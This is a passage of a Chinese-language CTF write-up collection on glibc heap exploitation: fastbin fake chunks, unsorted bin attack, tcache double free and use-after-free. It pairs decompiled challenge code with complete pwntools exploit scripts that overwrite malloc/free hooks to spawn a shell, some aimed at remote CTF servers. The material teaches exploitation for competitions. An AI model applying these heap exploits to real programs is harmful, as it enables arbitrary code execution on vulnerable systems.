+        sub_4009D7(s, 8LL);                     // free, uaf
+        break;
+      case 3:
+        sub_400A4D();                           // 写content,只能写8字节
+        break;
+      case 4:
+        sub_400896();                          //sys，
+        break;
+      case 5:
+        exit(0);
+      default:
+        puts(&quot;invalid&quot;);
+        break;
+    }
+  }
+}
+
+
+
+int sub_400896()
+{
+  if ( qword_602090 )     //伪造堆，改此处0x602090为0
+    return puts(&quot;Not yet&quot;);
+  else
+    return system(&quot;/bin/sh&quot;);
+}
+</code></pre>
+<p>发现阴影部分已经给我们构建好了要伪造的堆块</p>
+<p><img src="/__published_media/external/%E5%9B%BE%E5%BA%93/image-20240711125844052.png" alt="image-20240711125844052"></p>
+<p>exp</p>
+<pre><code class="language-py">from pwn import *
+context(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;debug&#39;)
+#context.update(arch=&#39;i386&#39;,os=&#39;linux&#39;,log_level=&#39;debug&#39;)
+# context(os=&#39;linux&#39;, arch=&#39;amd64&#39;)
+file_name = &quot;./pwn&quot;
+e = ELF(file_name)
+p= process(file_name)
+#libc = ELF(&#39;./&#39;)
+#p = remote(&#39;node5.buuoj.cn&#39;,27541)
+
+def debug():
+    gdb.attach(p)
+    #gdb.attach(p,&#39;b *0x\nc&#39;)
+sd = lambda s : p.send(s)
+sl = lambda s : p.sendline(s)
+sa = lambda n,s : p.sendafter(n,s)
+sla = lambda n,s : p.sendlineafter(n,s)
+rc = lambda n : p.recv(n)
+rl = lambda : p.recvline()
+ru = lambda s : p.recvuntil(s)
+ra = lambda : p.recvall()
+it = lambda : p.interactive()
+uu32 = lambda data : u32(data.ljust(4, b&#39;\x00&#39;))
+uu64 = lambda data : u64(data.ljust(8, b&#39;\x00&#39;))
+def choice(idx):
+    sla(&#39;choice&gt;\n&#39;,str(idx))
+
+def add(size):
+    choice(1)
+    sla(&#39;size&gt;\n&#39;,str(size))    
+def delete(idx):
+    choice(2)
+    sla(&#39;index&gt;\n&#39;,str(idx))
+
+def edit(idx,content):
+    choice(3)
+    sla(&#39;index&gt;\n&#39;,str(idx))
+    sd(content)
+def sys():
+    choice(4)
+
+fake=0x602080 //要构造的地址
+
+add(0x40)
+delete(0) //大小在fastbin范围内，释放直接进fastbin不会合并topchunk
+edit(0,p64(fake)) //改fd指针为伪造地址
+
+add(0x40)
+add(0x40)//最后一个add将伪造堆地址添加到记录堆的数组，以便修改函数edit能找到此堆块并改1为0 
+edit(2,p64(0))
+sys()
+
+it()
+</code></pre>
+<h4>hitcontraining_magicheap</h4><p>题干 libc2.23 unsorted bin attack</p>
+<pre><code class="language-c">int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
+{
+  int v3; // eax
+  char buf[8]; // [rsp+0h] [rbp-10h] BYREF
+  unsigned __int64 v5; // [rsp+8h] [rbp-8h]
+
+  v5 = __readfsqword(0x28u);
+  setvbuf(_bss_start, 0LL, 2, 0LL);
+  setvbuf(stdin, 0LL, 2, 0LL);
+  while ( 1 )
+  {
+    while ( 1 )
+    {
+      menu();
+      read(0, buf, 8uLL);
+      v3 = atoi(buf);
+      if ( v3 != 3 )
+        break;
+      delete_heap();
+    }
+    if ( v3 &gt; 3 )
+    {
+      if ( v3 == 4 )
+        exit(0);
+      if ( v3 == 4869 )
+      {
+        if ( magic &lt;= 0x1305 ) //把magic地址改掉就执行后门
+        {
+          puts(&quot;So sad !&quot;);
+        }
+        else
+        {
+          puts(&quot;Congrt !&quot;);
+          l33t();   //system
+        }
+      }
+      else
+      {
+LABEL_17:
+        puts(&quot;Invalid Choice&quot;);
+      }
+    }
+    else if ( v3 == 1 )
+    {
+      create_heap();
+    }
+    else
+    {
+      if ( v3 != 2 )
+        goto LABEL_17;
+      edit_heap();
+    }
+  }
+}
+
+
+
+
+
+int edit_heap()
+{
+  int v1; // [rsp+0h] [rbp-10h]
+  char buf[4]; // [rsp+4h] [rbp-Ch] BYREF
+  __int64 v3; // [rsp+8h] [rbp-8h]
+
+  printf(&quot;Index :&quot;);
+  read(0, buf, 4uLL);
+  v1 = atoi(buf);
+  if ( v1 &gt;= 0xA )
+  {
+    puts(&quot;Out of bound!&quot;);
+    _exit(0);
+  }
+  if ( !heaparray[v1] )
+    return puts(&quot;No such heap !&quot;);
+  printf(&quot;Size of Heap : &quot;);
+  read(0, buf, 8uLL);//一个堆溢出，可以自己指定大小。
+  v3 = atoi(buf);
+  printf(&quot;Content of heap : &quot;); 
+  read_input(heaparray[v1], v3);
+  return puts(&quot;Done !&quot;);
+}
+</code></pre>
+<p>exp</p>
+<p>题目无法通过输入直接修改magic的值，因此想到利用unsoted bin特性（只有一个free 堆时fd bk指向一个大地址）</p>
+<pre><code class="language-py">from pwn import*
+ 
+r = process(&#39;./pwn&#39;)
+#r =remote(&#39;node5.buuoj.cn&#39;,28360)
+ 
+def create(size,content):
+	r.sendlineafter(&#39;Your choice :&#39;,&#39;1&#39;)
+	r.sendlineafter(&#39;Size of Heap :&#39;,str(size))
+	r.sendlineafter(&#39;Content of heap:&#39;,content)
+	
+def edit(idx,size,content):
+	r.sendlineafter(&#39;Your choice :&#39;,&#39;2&#39;)
+	r.sendlineafter(&#39;Index :&#39;,str(idx))
+	r.sendlineafter(&#39;Size of Heap :&#39;,str(size))
+	r.sendlineafter(&#39;Content of heap :&#39;,content)
+	
+def delete(idx):
+	r.sendlineafter(&#39;Your choice :&#39;,&#39;3&#39;)
+	r.sendlineafter(&#39;Index :&#39;,str(idx))
+	
+create(0x30,&#39;aaaa&#39;) #0号堆块堆溢出时使用
+create(0x80,&#39;bbbb&#39;) 
+create(0x10,&#39;cccc&#39;) #2号堆块防止1号堆块和topchunk合并
+#gdb.attach(r)
+ 
+delete(1)
+
+magic_addr = 0x06020A0 
+edit(0,0x50,0x30 * b&quot;a&quot; + p64(0)+p64(0x91)+p64(0)+p64(magic_addr-0x10))#bk处magic-0x10是为了伪造成堆指针，从而伪造堆块
+ 
+create(0x80,&#39;dddd&#39;) #将1号堆块回收，此时unsoted bin只剩伪造的堆块，见下图
+r.sendlineafter(&#39;Your choice :&#39;,&#39;4869&#39;)
+r.interactive()
+</code></pre>
+<p><img src="/__published_media/external/%E5%9B%BE%E5%BA%93/image-20240714121925053.png" alt="image-20240714121925053"></p>
+<h1>double free</h1><p>double free可以通过对同一块内存free两次，实现任意地址写。当libc版本在2.26以上时，free的块优先放入tcache，malloc也优先从tcache中取，性能更好。但是安全检查变弱了。</p>
+<pre><code class="language-c">static void
+tcache_put (mchunkptr chunk, size_t tc_idx)
+{
+  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
+  assert (tc_idx &lt; TCACHE_MAX_BINS);c
+  e-&gt;next = tcache-&gt;entries[tc_idx];
+  tcache-&gt;entries[tc_idx] = e;
+  ++(tcache-&gt;counts[tc_idx]);
+}
+</code></pre>
+<p>tcache free代码如上，只校验了tc_idx的值是否到达TCACHE_MAX_BINS（7），并没有其他的检查，相比fastbin或者其它bin的double free，tcache double free更加简单。</p>
+<p>double free 原理
+如果程序存在某些漏洞可以对同一个地址free两次，则存在double free。比如，在调用free函数后，不把指针变量置NULL，或者不检查该内存是否被free过了。
+如果存在，对于tcache，那么通常的利用步骤是：</p>
+<p>double free 地址A，让A进入tcache，并A的fd指针指向自己。（tcache[7]: A-----&gt;A)
+调用malloc，将A分配出来，这时tcache中还有一个A（tcache[7]: A）；
+伪造tcache中的A，修改A的fd为free函数或者print函数got表中地址，或者hook地址，或者任意地址。这样让free函数地址插入到了tcache中；（tcache[7]: A—&gt;__free_hook）
+再调用一次malloc，将tcache剩余的一个A分配出来。
+最后调用malloc的时候，就能将__free_hook的地址分配出来了。实现任意地址写。
+最后我们可以向__free_hook地址中（或者其它任意地址）写入system函数或者one_gadget地址。调用free的时候就能跳转到one_gadget去实现程序流控制；</p>
+<p>2.27后key指针绕过</p>
+<p><a href="https://wiki.mrskye.cn/Pwn/glibc-heap/libc2.29_tcache_doublefree/libc2.29_tcache_doublefree/">https://wiki.mrskye.cn/Pwn/glibc-heap/libc2.29_tcache_doublefree/libc2.29_tcache_doublefree/</a></p>
+<h2 id="section-21">gundam  (libc-2.26)</h2><p><a href="https://blog.csdn.net/weixin_48066554/article/details/125058636">hitb2018_gundam —— tcache double free-CSDN博客</a></p>
+<p>exp</p>
+<pre><code class="language-python">from pwn import *
+context(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;debug&#39;)
+#context.update(arch=&#39;i386&#39;,os=&#39;linux&#39;,log_level=&#39;debug&#39;)
+# context(os=&#39;linux&#39;, arch=&#39;amd64&#39;)
+file_name = &quot;./pwn&quot;
+e = ELF(file_name)
+p= process(file_name)
+lib = &#39;./libc.so.6&#39;
+select=1
+if select == 0:
+    p=process(file_name)
+    libc = ELF(lib)
+else:
+    p=remote(&#39;node5.buuoj.cn&#39;,26569)
+    libc = ELF(lib)
+def debug():
+    gdb.attach(p)
+    #gdb.attach(p,&#39;b *0x\nc&#39;)
+sd = lambda s : p.send(s)
+sl = lambda s : p.sendline(s)
+sa = lambda n,s : p.sendafter(n,s)
+sla = lambda n,s : p.sendlineafter(n,s)
+rc = lambda n : p.recv(n)
+rl = lambda : p.recvline()
+ru = lambda s : p.recvuntil(s)
+ra = lambda : p.recvall()
+it = lambda : p.interactive()
+uu32 = lambda data : u32(data.ljust(4, b&#39;\x00&#39;))
+uu64 = lambda data : u64(data.ljust(8, b&#39;\x00&#39;))
+
+def build(name):
+	sa(&quot;Your choice : &quot;, &#39;1&#39;)
+	sa(&quot;The name of gundam :&quot;, name)
+	sla(&quot;The type of the gundam :&quot;, &#39;1&#39;)
+def visit():
+	sa(&quot;Your choice : &quot;, &#39;2&#39;)
+def destory(idx):
+	sa(&quot;Your choice : &quot;, &#39;3&#39;)
+	sla(&quot;Which gundam do you want to Destory:&quot;, str(idx))
+def exit():
+	sa(&quot;Your choice : &quot;, &#39;5&#39;)
+def blowup():
+	sa(&quot;Your choice : &quot;, &#39;4&#39;)
+
+for i in range(9):
+	build(b&#39;a&#39;)
+
+for i in range(9):
+	destory(i)
+
+blowup()
+for i in range(9):
+	build(b&#39;a&#39;*8)
+visit()
+ru(&#39;Gundam[7] :aaaaaaaa&#39;)
+base=u64(rc(6).ljust(8,b&#39;\x00&#39;))-0x3dac78 
+print(&#39;base:&#39;,hex(base))
+
+free_hook_addr = base + libc.symbols[&#39;__free_hook&#39;]
+system_addr = base + libc.symbols[&#39;system&#39;]
+
+# debug()
+destory(2)
+destory(1)
+destory(0)
+destory(0) #2.26的double free，无检查
+
+blowup()#有了4个destroy此时才会释放3个0x30大小堆，3个应为0是二次释放
+build(p64(free_hook_addr))
+# debug()
+build(b&#39;/bin/sh\x00&#39;)
+build(p64(system_addr))
+destory(1)
+it()
+</code></pre>
+<h1>uaf</h1><p>程序在释放了某块内存（<code>free()</code>）后未将此块内存指针清0，<strong>继续使用这块已经被释放的内存</strong>，这会导致<strong>未定义行为</strong>，可能被攻击者利用来执行任意代码或泄露信息。</p>
+<h4>litctf  heap2.23</h4><pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  int v4; // [rsp+4h] [rbp-Ch] BYREF
+  unsigned __int64 v5; // [rsp+8h] [rbp-8h]
+
+  v5 = __readfsqword(0x28u);
+  init(argc, argv, envp);
+  v4 = 0;
+  while ( 1 )
+  {
+    menu();
+    __isoc99_scanf(&quot;%d&quot;, &amp;v4);
+    switch ( v4 )
+    {
+      case 1:
+        create();
+        break;
+      case 2:
+        delete();
+        break;
+      case 3:
+        show();
+        break;
+      case 4:
+        edit();
+        break;
+      case 5:
+        Exit();
+      default:
+        puts(&quot;error!&quot;);
+        break;
+    }
+  }
+}
+</code></pre>
+<p>exp</p>
+<pre><code class="language-py">from pwn import *
+
+filename = &#39;./heap&#39;
+
+debug = 0
+if debug :
+    io = remote(&#39;node2.anna.nssctf.cn&#39;, 28352)
+else:
+    io = process(filename)
+
+elf = ELF(filename)
+
+context(arch = elf.arch, log_level = &#39;debug&#39;, os = &#39;linux&#39;)
+
+def dbg():
+	gdb.attach(io)
+	
+def add(index, size):
+	io.sendlineafter(&#39;&gt;&gt;&#39;, &#39;1&#39;)
+	io.sendlineafter(&#39;idx? &#39;, str(index))
+	io.sendlineafter(&#39;size? &#39;, str(size))
+	
+def delete(index):
+	io.sendlineafter(&#39;&gt;&gt;&#39;, &#39;2&#39;)
+	io.sendlineafter(&#39;idx? &#39;, str(index))
+	
+def show(index):
+	io.sendlineafter(&#39;&gt;&gt;&#39;, &#39;3&#39;)
+	io.sendlineafter(&#39;idx? &#39;, str(index))
+	
+def edit(index, content):
+	io.sendlineafter(&#39;&gt;&gt;&#39;, &#39;4&#39;)
+	io.sendlineafter(&#39;idx? &#39;, str(index))
+	io.sendlineafter(&#39;content : &#39;, content)
+	
+libc = ELF(&#39;./libc.so.6&#39;)
+
+add(0, 0x80)
+add(1, 0x60)#上一个堆块大小0x80不能进入fastbin,释放会与topchunk合并
+delete(0)
+show(0)
+io.recvuntil(&#39;content : &#39;)
+__malloc_hook = u64(io.recv(6).ljust(8, b&#39;\x00&#39;)) - 0x68
+success(&#39;__malloc_hook =&gt;&gt; &#39; + hex(__malloc_hook))
+libcbase = __malloc_hook - libc.sym[&#39;__malloc_hook&#39;]
+onegadget = libcbase + 0xf1247
+
+delete(1)#不防和topchunk合并因为0x70大小在fastbin范围，释放直接连入fastbin
+edit(1, p64(__malloc_hook - 0x23))#uaf伪造了一个堆块，-0x23是为了通过glibc2.23堆检测，size位要有值
+
+add(2, 0x60)
+add(3, 0x60)
+edit(3, b&#39;A&#39; * 0x13 + p64(onegadget))#这是那个伪造堆块，不会在heap调试信息显示，因为base+libc.sym[&#39;__malloc_hook&#39;] - 0x23在栈段上
+
+add(4, 0x60)#为了触发被改成ogg的malloc_hook，调用malloc时先检查malloca_hook是否为空，不为空则执行malloca_hook
+
+io.interactive()
+
+</code></pre>
+<h4>长城Kylin_Heap 2.31 libc</h4><p>题干：delete存在uaf</p>
+<p>exp</p>
+<pre><code class="language-py">from pwn import *
+context(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;debug&#39;)
+#context.update(arch=&#39;i386&#39;,os=&#39;linux&#39;,log_level=&#39;debug&#39;)
+# context(os=&#39;linux&#39;, arch=&#39;amd64&#39;)
+file_name = &quot;./pwn&quot;
+e = ELF(file_name)
+p= process(file_name)
+lib = &#39;./libc-2.31-0kylin9.2k0.2.so&#39;
+select=0
+if select == 0:
+    p=process(file_name)
+    libc = ELF(lib)
+else:
+    p=remote(&#39;&#39;)
+    libc = ELF(lib)
+def debug():
+    gdb.attach(p)
+    #gdb.attach(p,&#39;b *0x\nc&#39;)
+sd = lambda s : p.send(s)
+sl = lambda s : p.sendline(s)
+sa = lambda n,s : p.sendafter(n,s)
+sla = lambda n,s : p.sendlineafter(n,s)
+rc = lambda n : p.recv(n)
+rl = lambda : p.recvline()
+ru = lambda s : p.recvuntil(s)
+ra = lambda : p.recvall()
+it = lambda : p.interactive()
+uu32 = lambda data : u32(data.ljust(4, b&#39;\x00&#39;))
+uu64 = lambda data : u64(data.ljust(8, b&#39;\x00&#39;))
+def choice(idx):
+    sla(&#39;What will you do, adventurer?&#39;,str(idx))
+
+def add(size,content):
+    choice(1)
+    sla(&#39;bytes): &#39;,str(size))    
+    sa(&#39;bytes):\n&#39;,content)
+def delete(idx):
+    choice(2)
+    sla(&#39;: &#39;,str(idx))
+def show(idx):
+    choice(4)
+    sla(&#39;: &#39;,str(idx))
+def edit(idx,content):
+    choice(3)
+    sla(&quot;: &quot;,str(idx))
+    sla(&#39;bytes):\n&#39;,content)
+
+add(0x500,b&#39;a&#39;)
+add(0x28,b&#39;a&#39;) #原因避免下一步free后堆和top chunk合并导致在unsortedbin中找不到堆块
+delete(0)
+# debug()
+show(0)
+ru(&#39;:\n&#39;)
+base=u64(rc(6).ljust(8,b&#39;\x00&#39;))-0x1ebbe0
+print(&#39;base:&#39;+hex(base))
+free_hook=base+libc.sym[&#39;__free_hook&#39;] 
+print(&#39;freehook:&#39;,hex(free_hook))
+
+ogg=base+0xe6c7e #0xe6c7e 0xe6c81 0xe6c84
+system_addr=base+libc.sym[&quot;system&quot;]
+
+add(0x40,b&#39;a&#39;)#2
+add(0x40,b&#39;a&#39;)#3
+delete(2)
+delete(3)
+edit(3,p64(free_hook))
+add(0x40,b&#39;/bin/sh\x00&#39;)#4
+add(0x40,p64(system_addr))#5 是freehook
+delete(4) #因为delete那段代码会把chunk中内容压入rdi
+
+it() 
+</code></pre>
+<h4>bjdctf_2020_YDSneedGrirlfriend</h4><p>题干</p>
+<pre><code class="language-c">add函数：
+unsigned __int64 add_girlfriend()
+{
+  __int64 v0; // rbx
+  int i; // [rsp+8h] [rbp-28h]
+  int v3; // [rsp+Ch] [rbp-24h]
+  char buf[8]; // [rsp+10h] [rbp-20h] BYREF
+  unsigned __int64 v5; // [rsp+18h] [rbp-18h]
+
+  v5 = __readfsqword(0x28u);
+  if ( count &lt;= 10 )
+  {
+    for ( i = 0; i &lt;= 9; ++i )
+    {
+      if ( !*(&amp;girlfriendlist + i) )
+      {
+        *(&amp;girlfriendlist + i) = malloc(0x10uLL);
+        if ( !*(&amp;girlfriendlist + i) )
+        {
+          puts(&quot;Alloca Error&quot;);
+          exit(-1);
+        }
+        **(&amp;girlfriendlist + i) = print_girlfriend_name;
+        printf(&quot;Her name size is :&quot;);
+        read(0, buf, 8uLL);
+        v3 = atoi(buf);
+        v0 = *(&amp;girlfriendlist + i);
+        *(v0 + 8) = malloc(v3);
+        if ( !*(*(&amp;girlfriendlist + i) + 1) )
+        {
+          puts(&quot;Alloca Error&quot;);
+          exit(-1);
+        }
+        printf(&quot;Her name is :&quot;);
+        read(0, *(*(&amp;girlfriendlist + i) + 1), v3);
+        puts(&quot;Success !Wow YDS get a girlfriend!&quot;);
+        ++count;
+        return __readfsqword(0x28u) ^ v5;
+      }
+    }
+  }
+  else
+  {
+    puts(&quot;Full&quot;);
+  }
+  return __readfsqword(0x28u) ^ v5;
+
+、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、
+free函数：
+unsigned __int64 del_girlfriend()
+{
+  int v1; // [rsp+Ch] [rbp-14h]
+  char buf[8]; // [rsp+10h] [rbp-10h] BYREF
+  unsigned __int64 v3; // [rsp+18h] [rbp-8h]
+
+  v3 = __readfsqword(0x28u);
+  printf(&quot;Index :&quot;);
+  read(0, buf, 4uLL);
+  v1 = atoi(buf);
+  if ( v1 &gt;= 0 &amp;&amp; v1 &lt; count )
+  {
+    if ( *(&amp;girlfriendlist + v1) )
+    {
+      free(*(*(&amp;girlfriendlist + v1) + 1));
+      free(*(&amp;girlfriendlist + v1));
+      puts(&quot;Success&quot;);
+    }
+  }
+  else
+  {
+    puts(&quot;Out of bound!&quot;);
+  }
+  return __readfsqword(0x28u) ^ v3;
+}
+。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。
+show函数：
+unsigned __int64 print_girlfriend()
+{
+  int v1; // [rsp+Ch] [rbp-14h]
+  char buf[8]; // [rsp+10h] [rbp-10h] BYREF
+  unsigned __int64 v3; // [rsp+18h] [rbp-8h]
+
+  v3 = __readfsqword(0x28u);
+  printf(&quot;Index :&quot;);
+  read(0, buf, 4uLL);
+  v1 = atoi(buf);
+  if ( v1 &gt;= 0 &amp;&amp; v1 &lt; count )
+  {
+    if ( *(&amp;girlfriendlist + v1) )
+      (**(&amp;girlfriendlist + v1))(*(&amp;girlfriendlist + v1)); //调用了对应函数
+  }
+  else
+  {
+    puts(&quot;Out of bound!&quot;);
+  }
+  return __readfsqword(0x28u) ^ v3;
+}
+/////////////////////////////////////c
+有后门backdoor
+</code></pre>
+<p>正常堆块结构（也就是内容堆块的结构）</p>
+<p><img src="/__published_media/external/%E5%9B%BE%E5%BA%93/image-20240530151937287.png" alt="image-20240530151937287"></p>
+<p>a堆块结构</p>
+<p><img src="/__published_media/external/%E5%9B%BE%E5%BA%93/image-20240530152043183.png" alt="image-20240530152043183"></p>
+<p>利用思路：
+申请size同为0x20大小的chunk，
+doublefree
+申请个不同size的chunk，使从bin链中只取出一个0x20
+我们就能控制前面图片中a指针的值了</p>
+<p><img src="/__published_media/external/%E5%9B%BE%E5%BA%93/image-20240711150533821.png" alt="image-20240711150533821"></p>
+<p>exp</p>
+<pre><code class="language-py">from pwn import *
+context(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;debug&#39;)
+#context.update(arch=&#39;i386&#39;,os=&#39;linux&#39;,log_level=&#39;debug&#39;)
+# context(os=&#39;linux&#39;, arch=&#39;amd64&#39;)
+file_name = &quot;./pwn&quot;
+e = ELF(file_name)
+#p= process(file_name)
+libc = ELF(&#39;./libc-2.23.so&#39;)
+p = remote(&#39;node5.buuoj.cn&#39;,28551)
+
+def debug():
+    gdb.attach(p)
+    #gdb.attach(p,&#39;b *0x\nc&#39;)
+sd = lambda s : p.send(s)
+sl = lambda s : p.sendline(s)
+sa = lambda n,s : p.sendafter(n,s)
+sla = lambda n,s : p.sendlineafter(n,s)
+rc = lambda n : p.recv(n)
+rl = lambda : p.recvline()
+ru = lambda s : p.recvuntil(s)
+ra = lambda : p.recvall()
+it = lambda : p.interactive()
+uu32 = lambda data : u32(data.ljust(4, b&#39;\x00&#39;))
+uu64 = lambda data : u64(data.ljust(8, b&#39;\x00&#39;))
+def choice(idx):
+    sa(&quot;Your choice :&quot;,str(idx))
+def add(size,content):
+    choice(1)   
+    sa(&#39;Her name size is :&#39;,str(size))
+    sa(&#39;Her name is :&#39;,content)
+def delete(idx):
+    choice(2)
+    sa(&#39;Index :&#39;,str(idx))
+    #print(&quot;删掉chunk%d&quot; % idx)
+def show(idx):
+    choice(3)
+    sa(&#39;Index :&#39;,str(idx))
+def exit():
+    choice(4)
+    
+sys=0x400B9C 
+add(0x10,b&#39;a&#39;)
+delete(0)
+delete(0)
+add(0x20,b&#39;a&#39;)  //注意取的大小是0x20，
+add(0x10,p64(sys))
+show(0)
+it()
+</code></pre>
+<h4>HNctf what</h4><p>（不能指定堆块定位参数）</p>
+<pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  int v4; // [rsp+4h] [rbp-Ch] BYREF
+  unsigned __int64 v5; // [rsp+8h] [rbp-8h]
+
+  v5 = __readfsqword(0x28u);
+  setv111(argc, argv, envp);
+  v4 = 0;
+  puts(&quot;Welcome to H&amp;NCTF2024&quot;);
+  while ( 1 )
+  {
+    menu();
+    __isoc99_scanf(&quot;%d&quot;, &amp;v4);
+    if ( v4 &lt;= 0 || v4 &gt; 5 )
+    {
+      puts(&quot;Error&quot;);
+    }
+    else
+    {
+      switch ( v4 )
+      {
+        case 1:
+          allocate();
+          break;
+        case 2:
+          free_0(); //从最后一个堆块开始删
+          break;
+        case 3:
+          show();
+          break;
+        case 4:
+          edit();
+          break;
+        case 5:
+          exit(0);
+        default:
+          continue;
+      }
+    }
+  }
+</code></pre>
+<p>exp</p>
+<pre><code class="language-py">from pwn import *
+p=process(&#39;./what&#39;)  
+elf=ELF(&#39;./what&#39;)  
+lib=elf.libc  
+context.log_level=&#39;debug&#39;  
+#p=remote(&#39;hackf.imxbt.cn&#39;,42474)  
+def debug():
+    gdb.attach(p)
+    #gdb.attach(p,&#39;b *0xd55\nc&#39;)
+sd = lambda s : p.send(s)
+sl = lambda s : p.sendline(s)
+sa = lambda n,s : p.sendafter(n,s)
+sla = lambda n,s : p.sendlineafter(n,s)
+rc = lambda n : p.recv(n)
+rl = lambda : p.recvline()
+ru = lambda s : p.recvuntil(s)
+ra = lambda : p.recvall()
+it = lambda : p.interactive()
+def choice(idx):
+    sla(&#39;Enter your command:\n&#39;,str(idx))
+
+def add(size):
+    choice(1)
+    sla(&#39;size&#39;,str(size))
+    #print(&quot;添加chunk%d&quot; % idx)   
+def delete():
+    choice(2)
+    #print(&quot;删掉chunk%d&quot; % idx)
+def show(idx):
+    choice(3)
+    sa(&#39;please enter idx:\n&#39;,str(idx))
+def edit(idx,content):
+    choice(4)
+    sa(&quot;please enter idx:\n&quot;,str(idx))
+    sa(&quot;Please enter your content:\n&quot;,content)
+ 
+debug
+add(0x10)  #0
+add(0x500)  #1
+add(0x10)  #2
+
+delete()  #2
+delete()  #1
+ 
+show(1)  
+p.recvuntil(&#39;Content:&#39;)  
+base_addr=u64(p.recv(6).ljust(8,b&#39;\x00&#39;))-0x3ebca0  
+print(hex(base_addr))  
+free_hook=base_addr+lib.sym[&#39;__free_hook&#39;]  
+system_addr=base_addr+lib.sym[&#39;system&#39;]  
+
+edit(2,p64(free_hook))  
+#debug() 
+add(0x10)  #1指向freehook
+add(0x10) #2就是free_hook
+add(0x10)  #3从unsortbin0x500大小的切下一部分
+edit(3,b&#39;/bin/sh\x00&#39;)  
+edit(2,p64(system_addr))  #把freehook改system
+delete()  #删去3,把内容弹到rdi
+p.interactive()
+</code></pre>
+<h4>iscc2024-iscc—u</h4><p>查看保护
+<img src="/__published_media/external/%E5%9B%BE%E5%BA%93/a6e7db68703a75165705d5f65633366d_MD5.png" alt=""></p>
+<p>代码分析</p>
+<p>菜单栏</p>
+<pre><code class="language-c">int menu()
+{
+  puts(&quot;----------------------&quot;);
+  puts(aWelcomeToIscc);
+  puts(&quot;----------------------&quot;);
+  puts(&quot; 1. Add note          &quot;);
+  puts(&quot; 2. Delete note       &quot;);
+  puts(&quot; 3. Print note        &quot;);
+  puts(&quot; 4. Exit              &quot;);
+  puts(&quot;----------------------&quot;);
+  return printf(&quot;What&#39;s your choice :&quot;);
+}
+</code></pre>
+<p>add note函数</p>
+<pre><code class="language-c">int __cdecl print_note_content(int a1)
+{
+  return puts(*(a1 + 4));
+}
+
+
+unsigned int add_note()
+{
+  int v0; // esi
+  int i; // [esp+Ch] [ebp-1Ch]
+  int size; // [esp+10h] [ebp-18h]
+  char buf[8]; // [esp+14h] [ebp-14h] BYREF
+  unsigned int v5; // [esp+1Ch] [ebp-Ch]
+
+  v5 = __readgsdword(0x14u);
+  if ( count &lt;= 5 )
+  {
+    for ( i = 0; i &lt;= 4; ++i )
+    {
+      if ( !*(&amp;notelist + i) )
+      {
+        *(&amp;notelist + i) = malloc(8u); //全局变量数组notelist，我们暂且把它存放的堆称作a堆
+        if ( !*(&amp;notelist + i) )
+        {
+          puts(&quot;Alloca Error&quot;);
+          exit(-1);
+        }
+        **(&amp;notelist + i) = print_note_content; //以函数名出现，没带括号()表示 **(&amp;notelist + i)存放了print_note_content函数的地址，此函数功能是打印a堆content部分加4字节的内容堆块中的内容。有点绕见图解。
+        printf(&quot;Note size :&quot;);
+        read(0, buf, 8u);
+        size = atoi(buf);
+        v0 = *(&amp;notelist + i);
+        *(v0 + 4) = malloc(size);
+        if ( !*(*(&amp;notelist + i) + 4) )
+        {
+          puts(&quot;Alloca Error&quot;);
+          exit(-1);
+        }
+        printf(&quot;Content :&quot;);
+        read(0, *(*(&amp;notelist + i) + 4), size);//将此堆块暂且称为内容堆块
+        puts(&quot;Success !&quot;);
+        ++count;
+        return __readgsdword(0x14u) ^ v5;
+      }
+    }
+  }
+  else
+  {
+    puts(&quot;Full&quot;);
+  }
+  return __readgsdword(0x14u) ^ v5;
+}
+</code></pre>
+<p>正常堆块结构（也就是内容堆块的结构）</p>
+<p><img src="/__published_media/external/%E5%9B%BE%E5%BA%93/image-20240530151937287.png" alt="image-20240530151937287"></p>
+<p>a堆块结构</p>
+<p><img src="/__published_media/external/%E5%9B%BE%E5%BA%93/image-20240530152043183.png" alt="image-20240530152043183"></p>
+<p>delete note(先释放内容堆块，再释放a堆块，并且没有将堆指针归0，存在uaf漏洞)</p>
+<pre><code class="language-c">unsigned int del_note()
+{
+  int v1; // [esp+4h] [ebp-14h]
+  char buf[4]; // [esp+8h] [ebp-10h] BYREF
+  unsigned int v3; // [esp+Ch] [ebp-Ch]
+
+  v3 = __readgsdword(0x14u);
+  printf(&quot;Index :&quot;);
+  read(0, buf, 4u);
+  v1 = atoi(buf);
+  if ( v1 &lt; 0 || v1 &gt;= count )
+  {
+    puts(&quot;Out of bound!&quot;);
+    _exit(0);
+  }
+  if ( *(&amp;notelist + v1) )
+  {
+    free(*(*(&amp;notelist + v1) + 4));
+    free(*(&amp;notelist + v1));
+    puts(&quot;Success&quot;);
+  }
+  return __readgsdword(0x14u) ^ v3;
+}
+</code></pre>
+<p>print_note()</p>
+<pre><code class="language-c">unsigned int print_note()
+{
+  int v1; // [esp+4h] [ebp-14h]
+  char buf[4]; // [esp+8h] [ebp-10h] BYREF
+  unsigned int v3; // [esp+Ch] [ebp-Ch]
+
+  v3 = __readgsdword(0x14u);
+  printf(&quot;Index :&quot;);
+  read(0, buf, 4u);
+  v1 = atoi(buf);
+  if ( v1 &lt; 0 || v1 &gt;= count )
+  {
+    puts(&quot;Out of bound!&quot;);
+    _exit(0);
+  }
+  if ( *(&amp;notelist + v1) )
+    (**(&amp;notelist + v1))(*(&amp;notelist + v1));//将**(&amp;notelist + v1)上地址作为函数调用，*(&amp;notelist + v1)做参数
+  return __readgsdword(0x14u) ^ v3;
+}
+</code></pre>
+<p>exp（把system换为one_gadget理应能出，但我这边环境问题不行。）</p>
+<pre><code class="language-py">from pwn import *
+#context(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;debug&#39;)
+context.update(arch=&#39;i386&#39;,os=&#39;linux&#39;,log_level=&#39;debug&#39;)
+# context(os=&#39;linux&#39;, arch=&#39;amd64&#39;)
+file_name = &quot;./WEEK2-pwn2_ISCC_U&quot;
+e = ELF(file_name)
+p= process(file_name)
